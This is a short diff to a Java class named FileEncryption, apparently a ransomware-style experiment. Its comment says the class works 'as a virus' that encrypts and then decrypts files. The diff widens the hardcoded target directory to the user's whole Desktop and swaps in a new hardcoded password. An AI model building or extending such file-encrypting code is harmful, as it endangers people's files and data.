@@ -91,13 +91,14 @@ public class FileEncryption {
     /**
      * Directory path
      */
-    private static final String DIR_PATH = "/Users/doct0rX/Desktop/ll";
+//    private static final String DIR_PATH = "/Users/doct0rX/Desktop/ll";
+    private static final String DIR_PATH = "/Users/doct0rX/Desktop";
 
     /**
      * Encryption Password
      */
-//    private static final String ENCRYPT_PASSWORD = "Arqa Al-Oud";
-    private static final String ENCRYPT_PASSWORD = "w3w3w3w3w3";
+    private static final String OUD = "Arqa-Al-0ud";
+//    private static final String ENCRYPT_PASSWORD = "w3w3w3w3w3";
     /**
      * Creates a new instance of a file encryption/decryption
      * that should be completed by calling main() as it must be working as a virus to encrypt then try to decrypt the file using the the key.
@@ -272,7 +273,7 @@ public class FileEncryption {
      * @return String password
      */
     public static String getPassword() {
-        return ENCRYPT_PASSWORD;
+        return OUD;
     }
 
     public static String getDirPath() {
